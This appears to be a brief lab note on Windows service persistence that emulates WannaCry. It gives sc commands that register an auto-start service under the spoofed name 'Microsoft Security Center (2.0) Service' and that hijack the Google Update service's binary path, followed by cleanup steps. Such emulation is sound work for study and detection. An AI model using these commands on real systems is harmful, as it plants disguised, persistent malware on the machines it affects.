# Create or Modify System Process: Windows Service

- Code and compile program `Windows Service Application` - WannaCry.exe

- Create Service `(Administrator: Command Prompt)`
  * Create Service follow case attack WannaCry.
  ```powershell
  sc create "mssecsvc2.0" DisplayName = "Microsoft Security Center (2.0) Service" binPath = "C:\Users\nigmaz\source\repos\WannaCry\x64\Release\WannaCry.exe" start = "auto"
  ```
  * Run service
  ```powershell
  sc start mssecsvc2.0
  sc stop mssecsvc2.0
  sc delete mssecsvc2.0
  ```

- Modify Service `(Administrator: Command Prompt)`
  * Modify google update service.
  ```powershell 
  sc config gupdate binPath= "C:\Users\nigmaz\source\repos\WannaCry\x64\Release\WannaCry.exe"
  sc start gupdate
  ```
  * Restore default path google update.
  ```powershell 
  sc config gupdate binPath= "\"C:\Program Files (x86)\Google\Update\GoogleUpdate.exe\" /svc" >nul 2>&1 
  ```
